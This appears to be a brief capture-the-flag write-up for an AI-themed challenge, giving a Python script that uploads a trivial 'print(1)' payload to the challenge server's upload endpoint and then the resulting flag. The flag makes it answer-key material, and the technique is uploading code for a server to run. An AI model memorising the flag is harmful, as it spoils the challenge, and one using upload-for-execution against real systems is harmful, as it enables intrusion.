---
created: 2024-08-08T08:23
updated: 2024-08-17T20:13
points: 425
---

Again, the challenge is kinda wonky.

Same payload as the first ai challenge.

```python
from io import BytesIO
import requests

payload = b"""
print(1)
""".strip()

print(requests.post('https://bugcrowd-im-still-watching-you.chals.io/upload', files={'file1': BytesIO(payload)}).text)
```

```flag
flag{are_you_the_keymaster}
```
